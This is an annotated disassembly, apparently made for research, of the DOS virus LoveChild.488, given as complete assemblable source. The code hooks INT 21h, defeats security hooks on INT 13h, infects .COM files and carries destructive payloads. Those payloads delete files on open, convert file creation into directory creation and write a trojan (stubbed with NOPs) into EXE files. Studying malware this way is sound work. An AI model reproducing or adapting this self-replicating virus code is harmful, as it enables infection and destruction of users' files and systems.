; Disassembly of `Virus.DOS.LoveChild.488`
;
; Source: COM file (MD5: 8d762199b232b20a7df0d1bec09b656c)

; ================================================================================

                     org 100h

k_virus_memory_location:  equ 4 * 78h        ; resides in the interrupt table, starting from int 78h!!
k_virus_infection_marker: equ 0FBh           ; STI, at the beginning of the file
k_system_clock_addr:      equ 046Ch          ; BIOS timer tick counter (increments ~18.2 times/second)

; HOST ===========================================================================

host:
                     sti
                     jmp     virus_entry_point

                     mov     ah, 2           ; Print char in DL
                     mov     dl, 7
                     int     21h
                     int     20h             ; Exit

                     times 0D4h db 0

; VIRUS ==========================================================================

virus_start:
                     db 'v2 (c) Flu Systems (R)'

virus_entry_point:
                     xor     ax, ax
                     mov     es, ax
                     call    compute_bp
compute_bp:
                     pop     si
                     mov     bp, si
                     mov     di, k_virus_memory_location
                     cld
                     cmp     word [es:di], 'v2' ; uses the string as memory check
                     jz      short return_to_host

                     sub     si, compute_bp - virus_start ; db 81h, 0EEh, 1Dh, 0 : inefficient version
                     nop
                     mov     cx, virus_body_end - virus_start ; see last instruction: skips the 0 (word)
                     rep movsb

                     mov     ah, 30h
                     int     21h             ; Get DOS version
                     cmp     ax, 1E03h       ; 3.30?
                     jnz     short dos_generic_int21_hijack

int13_reset_for_dos_330:
                     mov     si, 70h         ; At 0070:00B4h, DOS 3.30 holds the original INT 13h
                     mov     ds, si          ; address; the virus resets the current address stored
                     mov     si, 0B4h        ; in the interrupt table, so that if any security software
                     mov     di, 4 * 13h     ; was hooked, it is effectively disabled.
                     movsw
                     movsw

dos_330_int21_hijack:
                     mov     ax, 1203h
                     int     2Fh             ; Return: DS = segment of IBMDOS.COM/MSDOS.SYS
                     mov     word [es: k_virus_memory_location + virus_body_end - virus_start], ds ; save DOS data segment for later INT 21h calls
                     mov     si, 1460h       ; DOS 3.30 stores here the INT 21h address
                     mov     byte [si], 0EAh ; JMP FAR
                     mov     word [si+3], es ; 0
                     mov     word [si+1], k_virus_memory_location + int21_handler - virus_start
                     jmp     short return_to_host

dos_generic_int21_hijack:
                     push    es
                     pop     ds
                     mov     si, 4*21h
                     movsw
                     movsw
                     mov     word [si-2], es
                     mov     word [si-4], k_virus_memory_location + int21_handler - virus_start

return_to_host:
                     mov     ax, cs
                     mov     es, ax
                     mov     ds, ax
                     mov     di, 100h
                     mov     si, bp
                     add     si, host_header - compute_bp ; db 81h, 0C6h, 6Eh, 0 : inefficient version
                     nop
                     movsw
                     movsw
                     xor     ax, ax
                     sub     di, 4
                     jmp     di

; --------------------------------------------------------------------------------

host_header:
                     times 4 db 90h

new_header:
                     sti                     ; infection marker
                     jmp     word $+3
header_virus_jmp_address: equ $ - 2

; --------------------------------------------------------------------------------

int24_handler:
                     mov     al, 3
                     iret

; --------------------------------------------------------------------------------

trojan:
                     times 23 db 90h         ; destructive code

; --------------------------------------------------------------------------------

                     db 'LoveChild in reward for software sealing.' ; typo: "sTealing"

payload_2:
                     test    byte [cs:k_system_clock_addr], 7
                     jnz     short reset_counter_and_return_to_int21
                     pop     ds
                     pop     dx
                     pop     cx
                     pop     bx
                     pop     ax
                     mov     ah, 41h         ; delete file instead!

                     jmp     execute_original_int_21
; --------------------------------------------------------------------------------

reset_counter_and_return_to_int21:
                     jmp     reset_counter   ; and exit to int 21
; --------------------------------------------------------------------------------

v_payload_counter:   dw 1388h

int21_handler:
                     dec     word [cs:v_payload_counter]
                     js      short payload_1
                     jmp     execute_original_int_21
; --------------------------------------------------------------------------------

payload_1:
                     inc     word [cs:v_payload_counter] ; reset to 0
                     cmp     ah, 40h         ; write?
                     jnz     short evaluate_infection_B
                     push    di
                     mov     di, dx
                     cmp     word [di], 'MZ' ; EXE file?
                     jnz     short evaluate_infection_A
                     test    byte [cs:k_system_clock_addr], 6
                     jnz     short evaluate_infection_A
                     push    ds
                     push    cs
                     pop     ds
                     push    dx

write_trojan:
                     mov     dx, k_virus_memory_location + trojan - virus_start ; since AH = 40h (write), this will write the trojan
                     mov     cx, 40h
                     int     21h

return_from_interrupt_call:
                     pop     dx
                     pop     ds
                     pop     di
                     retf    2
; --------------------------------------------------------------------------------

evaluate_infection_A:
                     pop     di

evaluate_infection_B:
                     cmp     ah, 3Ch         ; create file?
                     jnz     short evaluate_infection_C
                     test    byte [cs:k_system_clock_addr], 31h
                     jnz     short evaluate_infection_C

payload_3:
                     mov     ah, 39h         ; convert create file to create directory (!)

evaluate_infection_C:
                     cmp     ah, 4Bh         ; execute?
                     jz      short handle_int24
                     cmp     ah, 3Dh         ; open file?
                     jz      short handle_int24
                     cmp     ah, 56h         ; rename?
                     jz      short handle_int24

                     jmp     execute_original_int_21
; --------------------------------------------------------------------------------

handle_int24:
                     push    ax
                     push    bx
                     push    cx
                     push    dx
                     push    ds
                     push    ax
                     xor     dx, dx
                     mov     ds, dx
                     mov     dx, k_virus_memory_location + int24_handler - virus_start
                     mov     ax, 2524h       ; Set Int 24h handler
                     int     21h
                     pop     ax
                     pop     ds
                     pop     dx

check_file_extension:
                     push    dx
                     push    ds
                     push    es
                     push    di
                     mov     di, dx
                     push    ds
                     pop     es
                     xor     al, al          ; find the filename end
                     mov     cx, 41h         ; up to the first 41h letters
                     repne scasb
                     mov     ax, [di-3]      ; point to last two letters of extension
                     or      ax, 2020h       ; lower case
                     cmp     ax, 'om'
                     pop     di
                     pop     es
                     jz      short load_file_header
                     jmp     near payload_2

load_file_header:
                     mov     word [cs:v_payload_counter], 1388h ; reset the counter
                     mov     ax, 3D02h       ; open file for r/w
                     int     21h

                     push    cs
                     pop     ds
                     push    ax
                     mov     bx, ax
                     mov     ah, 3Fh         ; read
                     mov     cx, 4
                     mov     dx, k_virus_memory_location + host_header - virus_start
                     int     21h

                     cmp     byte [cs:host_header], k_virus_infection_marker
                     jz      short exit_from_infection

                     mov     ax, 4202h       ; seek to the end of the file
                     pop     bx
                     push    bx
                     xor     cx, cx
                     mov     dx, cx
                     int     21h             ; returns DX:AX = new file position

; prepare the jump to virus entry point. the jump location must take into account, besides the
; string at the virus begin, one byte of marker, and other three bytes of the jump instruction
; itself (E9 0000 = JMP $+3), therefore we add 16h, and subtrace 1 and 3.

                     add     ax, virus_entry_point - virus_start - 1 - 3
                     mov     word [cs:header_virus_jmp_address], ax
                     mov     dx, k_virus_memory_location
                     mov     cx, virus_body_end - virus_start
                     pop     bx
                     push    bx
                     mov     ah, 40h         ; append virus
                     int     21h
                     jb      short exit_from_infection

                     mov     ax, 4200h       ; seek to the beginning of the file
                     pop     bx
                     push    bx
                     xor     cx, cx
                     mov     dx, cx
                     int     21h

                     mov     dx, k_virus_memory_location + new_header - virus_start
                     mov     cx, 4
                     pop     bx
                     push    bx
                     mov     ah, 40h         ; write header
                     int     21h

exit_from_infection:
                     pop     bx
                     mov     ah, 3Eh         ; close file
                     int     21h

reset_counter:
                     mov     word [cs:v_payload_counter], 0FFFFh

prepare_for_int21_return:
                     pop     ds
                     pop     dx
                     pop     cx
                     pop     bx
                     pop     ax

execute_original_int_21:
                     jmp     0:1467h         ; DOS 3.30: jumps to 0:1467h (original DOS INT 21h entry)
                                             ; Generic DOS: segment (0) is overwritten with saved INT 21h segment

virus_body_end:      equ $ - 2               ; Excludes last 2 bytes (JMP segment) from virus body.
                                             ; Generic DOS path stores original INT 21h vector here during
                                             ; installation (lines 75-78), overwriting the segment part of
                                             ; the JMP instruction. DOS 3.30 path uses hardcoded 0:1467h.
